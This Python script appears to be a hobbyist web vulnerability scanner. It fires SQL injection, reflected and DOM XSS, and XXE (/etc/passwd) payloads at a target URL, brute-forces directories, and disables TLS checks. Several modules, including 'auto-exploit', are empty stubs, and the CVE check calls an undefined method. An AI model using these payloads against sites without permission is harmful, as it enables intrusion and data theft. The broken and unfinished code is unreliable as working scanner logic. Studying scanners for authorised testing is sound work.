import requests
import argparse
import threading
import queue
import time
import json
import os
import re
import sys
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Suppress SSL warnings (for demo only - not recommended for production)
requests.packages.urllib3.disable_warnings()

class UltimateScanner:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.ua = UserAgent()
        self.cve_db = self.load_cve_database()
        self.vulnerabilities = []
        self.scan_stats = {
            "start_time": time.time(),
            "requests_sent": 0,
            "vulnerabilities_found": 0
        }
        self.config.use_zap = getattr(config, "use_zap", False)
        self.setup_session()

    def setup_session(self):
        self.session.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Scanner": "UltimateWebScanner/1.0"
        })
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}
        self.session.verify = False

    def load_cve_database(self):
        try:
            with open("cve_db.json") as f:
                return json.load(f)
        except:
            return {}

    def scan(self, url):
        print(f"[*] Scanning {url} with {self.config.threads} threads...")
        self.fingerprint_tech(url)
        self.check_cloud_misconfigs(url)

        modules = [
            self.bruteforce_directories,
            self.test_sql_injection,
            self.test_xss,
            self.test_dom_xss,
            self.test_lfi_rfi,
            self.test_xxe,
            self.test_ssrf,
            self.test_api_endpoints,
            self.test_cors_misconfig,
            self.test_jwt_issues,
            self.test_graphql
        ]

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [executor.submit(mod, url) for mod in modules]
            for future in futures:
                future.result()

        if self.config.use_zap:
            self.zap_active_scan(url)

        if self.config.auto_exploit:
            self.attempt_auto_exploit(url)

        self.generate_report(url)

    def zap_active_scan(self, url):
        try:
            zap_api = 'http://127.0.0.1:8080'
            zap_key = ''
            scan_url = f'{zap_api}/JSON/ascan/action/scan/?url={quote(url)}&apikey={zap_key}'

            print(f"[*] Sending to OWASP ZAP for active scan: {url}")
            requests.get(scan_url)
            status_url = f'{zap_api}/JSON/ascan/view/status/'

            while True:
                status = requests.get(status_url).json()['status']
                if status == '100':
                    break
                time.sleep(2)

            print(f"[+] ZAP scan complete for {url}")
        except Exception as e:
            print(f"[-] OWASP ZAP integration failed: {e}")

    def fingerprint_tech(self, url):
        res = self.request(url)
        if not res: return

        tech = {
            "server": res.headers.get("Server", ""),
            "x_powered_by": res.headers.get("X-Powered-By", ""),
            "cookies": list(res.cookies.keys()),
            "framework": self.detect_framework(res.text)
        }

        for cve in self.cve_db:
            if cve["tech"] in tech["server"] or cve["tech"] in tech["x_powered_by"]:
                if self.compare_versions(tech["server"], cve["vulnerable_versions"]):
                    self.log_vuln(
                        "CVE-" + cve["id"],
                        url,
                        f"Vulnerable {cve['tech']} version detected ({tech['server']})",
                        "High",
                        f"CVE-{cve['id']}: {cve['description']}"
                    )

    def bruteforce_directories(self, url):
        try:
            with open("wordlists/common_dirs.txt") as f:
                dirs = [d.strip() for d in f.readlines()]
        except:
            print("[-] Wordlist 'common_dirs.txt' not found.")
            return

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = []
            for directory in dirs:
                target = urljoin(url, directory)
                futures.append(executor.submit(self.check_dir, target))

            for future in futures:
                result = future.result()
                if result:
                    self.log_vuln("Directory Exposure", result["url"], result["msg"], result["severity"])

    def test_sql_injection(self, url):
        payloads = [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)",
            "1; SELECT PG_SLEEP(5)--"
        ]

        params = self.extract_parameters(url)

        for param, value in params.items():
            for payload in payloads:
                for mutant in self.mutate_payload(payload):
                    test_url = url.replace(f"{param}={value}", f"{param}={mutant}")
                    start_time = time.time()
                    res = self.request(test_url)
                    if not res: continue

                    if time.time() - start_time > 5:
                        self.log_vuln("SQL Injection (Time-Based)", test_url,
                                      f"Delay detected with payload: {mutant}", "Critical")

                    if any(err in res.text.lower() for err in ["syntax error", "mysql", "ora-"]):
                        self.log_vuln("SQL Injection (Error-Based)", test_url,
                                      f"Database error with payload: {mutant}", "Critical")

    def test_xss(self, url):
        payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']
        params = self.extract_parameters(url)

        for param, value in params.items():
            for payload in payloads:
                for mutant in self.mutate_payload(payload):
                    test_url = url.replace(f"{param}={value}", f"{param}={mutant}")
                    res = self.request(test_url)
                    if res and mutant in res.text:
                        self.log_vuln("XSS", test_url,
                                      f"Reflected XSS found with payload: {mutant}", "High")

    def test_dom_xss(self, url):
        try:
            payload = '"><script>document.body.setAttribute("data-xss","true")</script>'
            test_url = url + f"?q={quote(payload)}"

            options = Options()
            options.headless = True
            driver = webdriver.Chrome(options=options)
            driver.get(test_url)
            time.sleep(2)

            if driver.find_element("tag name", "body").get_attribute("data-xss") == "true":
                self.log_vuln("DOM XSS", test_url,
                              "DOM-based XSS triggered via JS injection", "High", payload)
            driver.quit()
        except Exception as e:
            if self.config.verbose:
                print(f"[-] Selenium DOM XSS test failed: {e}")

    def test_xxe(self, url):
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <foo>&xxe;</foo>"""

        headers = {"Content-Type": "application/xml"}
        res = self.request(url, method="POST", data=xxe_payload, headers=headers)

        if res and ("root:" in res.text or "[boot loader]" in res.text):
            self.log_vuln("XXE Injection", url, "XML External Entity injection possible", "Critical", res.text[:200])

    def mutate_payload(self, payload):
        mutations = [
            payload,
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("script", "scr<script>ipt"),
            payload.replace("\"", "\\\""),
            payload.replace("'", "\\'")
        ]
        return mutations

    def request(self, url, method="GET", **kwargs):
        try:
            self.scan_stats["requests_sent"] += 1
            if method.upper() == "GET":
                return self.session.get(url, timeout=self.config.timeout, **kwargs)
            elif method.upper() == "POST":
                return self.session.post(url, timeout=self.config.timeout, **kwargs)
        except Exception as e:
            if self.config.verbose:
                print(f"[-] Request failed: {str(e)}")
            return None

    def extract_parameters(self, url):
        parsed = urlparse(url)
        if not parsed.query:
            return {}
        return dict(qc.split("=") for qc in parsed.query.split("&") if "=" in qc)

    def log_vuln(self, category, url, description, severity, proof=None):
        vuln = {
            "category": category,
            "url": url,
            "description": description,
            "severity": severity,
            "proof": proof,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerabilities.append(vuln)
        self.scan_stats["vulnerabilities_found"] += 1
        if severity in ["Critical", "High"]:
            print(f"[!] {severity.upper()} FOUND: {category} at {url}")

    def generate_report(self, url):
        report = {
            "target": url,
            "scan_config": vars(self.config),
            "statistics": {
                "duration_sec": round(time.time() - self.scan_stats["start_time"], 2),
                "requests_sent": self.scan_stats["requests_sent"],
                "vulnerabilities_found": self.scan_stats["vulnerabilities_found"]
            },
            "findings": self.vulnerabilities
        }
        filename = f"scan_report_{urlparse(url).netloc}.json"
        with open(filename, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Scan complete! Report saved to {filename}")

    def detect_framework(self, html):
        if "wp-content" in html:
            return "WordPress"
        if "Drupal.settings" in html:
            return "Drupal"
        return "Unknown"

    def check_dir(self, url):
        res = self.request(url)
        if res and res.status_code == 200:
            return {"url": url, "msg": "Accessible directory found", "severity": "Medium"}

    def test_lfi_rfi(self, url): pass
    def test_ssrf(self, url): pass
    def test_api_endpoints(self, url): pass
    def test_cors_misconfig(self, url): pass
    def test_jwt_issues(self, url): pass
    def test_graphql(self, url): pass
    def check_cloud_misconfigs(self, url): pass
    def attempt_auto_exploit(self, url): pass

def main():
    parser = argparse.ArgumentParser(description="Ultimate Web Vulnerability Scanner")
    parser.add_argument("target", help="URL or file containing URLs to scan")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-x", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-a", "--auto-exploit", action="store_true", help="Enable auto exploitation")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--use-zap", action="store_true", help="Use OWASP ZAP integration")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    args = parser.parse_args()

    scanner = UltimateScanner(args)

    if os.path.isfile(args.target):
        with open(args.target) as f:
            for url in f.readlines():
                scanner.scan(url.strip())
    else:
        scanner.scan(args.target)

if __name__ == "__main__":
    banner = """
    ██╗   ██╗██╗  ██╗██████╗ ██╗   ██╗██╗   ██╗
    ██║   ██║██║  ██║██╔══██╗██║   ██║██║   ██║
    ██║   ██║███████║██████╔╝██║   ██║██║   ██║
    ██║   ██║╚════██║██╔═══╝ ██║   ██║██║   ██║
    ╚██████╔╝     ██║██║     ╚██████╔╝╚██████╔╝
     ╚═════╝      ╚═╝╚═╝      ╚═════╝  ╚═════╝ 
    """
    print(banner)
    main()
